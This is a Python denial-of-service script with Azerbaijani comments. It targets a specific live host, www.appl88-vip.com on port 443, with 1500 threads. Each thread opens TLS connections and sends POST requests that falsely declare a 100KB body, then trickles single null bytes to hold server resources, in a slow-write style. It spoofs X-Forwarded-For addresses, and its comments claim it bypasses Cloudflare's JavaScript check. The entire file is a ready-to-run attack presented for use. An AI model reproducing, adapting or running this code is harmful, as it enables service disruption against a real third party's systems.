import socket
import ssl
import threading
import random
import time
import os

# --- EXTREME TARGET ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1500 # Railway Paid plan üçün maksimal güc
BATCH_SIZE = 200 # Bir bağlantıda serveri boğan asinxron dalğa

def r_str(n):
    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def death_strike():
    # SSL Handshake-i serveri ən çox yoran üsulla (RSA-AES) qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle bypass
            s.settimeout(10)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Serveri "gözləmə" rejiminə salan, daxili bazanı yoran ağır müraciət
            # Bu müraciət Cloudflare-in JS-yoxlamasını bypass etmək üçün dizayn edilib
            for _ in range(BATCH_SIZE):
                path = f"/?ttclid={r_str(100)}&invite_code={random.randint(1000, 9999)}&v={time.time()}"
                
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"Accept: application/json, text/plain, */*\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 100000\r\n" # Serverə 100KB data göndərəcəyimizi yalan deyirik
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(payload)
                
                # İndi serveri kilitləyən "Slow-Write" texnikası:
                # Saniyədə cəmi 1 bayt göndəririk. Server bu bağlantını 30 saniyə açıq saxlamalı olur.
                conn.send(b"\x00")
                
            # Bağlantını bağlama, serverin RAM-ı tam dolana qədər "asılı" saxla
            time.sleep(5)
            conn.close()
        except:
            pass

def main():
    print(f"💀 THE VOID-NULL PROTOCOL ACTIVATED: {TARGET_HOST}")
    print("[!] Target is being saturated with persistent zombie-connections...")
    
    for i in range(THREADS):
        t = threading.Thread(target=death_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Death-Warheads deployed...")
            time.sleep(0.5)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
